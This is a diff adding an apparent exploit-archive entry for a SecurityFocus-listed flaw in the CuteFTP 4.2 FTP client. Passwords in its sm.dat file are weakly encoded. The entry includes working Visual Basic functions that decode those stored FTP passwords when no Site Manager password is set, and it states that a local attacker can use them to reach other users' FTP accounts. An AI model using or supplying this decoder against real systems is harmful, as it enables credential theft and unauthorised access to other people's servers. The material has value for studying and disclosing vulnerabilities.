@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/3233/info
+
+CuteFTP is a popular commercial FTP client for Microsoft Windows systems.
+
+CuteFTP v4.2(and possibly earlier versions) uses a weak system for encoding passwords for accounts on FTP sites. Passwords are stored in a file called 'sm.dat', and can be easily retrieved provided the site manager password has not been set.
+
+Successful exploitation of this vulnerability will allow a local attacker to gain unauthorized access to the FTP sites used by other local users.
+
+
+This piece of VB code will decode the passwords stored in sm.dat for the FTP accounts
+
+Works only if you have NOT set a password on the Site Manager!
+
+
+'Decode a single character
+Public Function CuteDecode(i_Asc As Integer)
+
+CuteDecode = ((Not i_Asc) And 200) + (i_Asc And 55)
+
+End Function
+
+'Decode password
+Public Function CuteDecodeString(str_password As String)
+
+Dim i As Integer
+
+CuteDecodeString = ""
+
+For i = 1 To Len(str_password)
+CuteDecodeString = CuteDecodeString + Chr$(CuteDecode(Asc(Mid(str_password, i, 1))))
+Next i
+
+End Function 
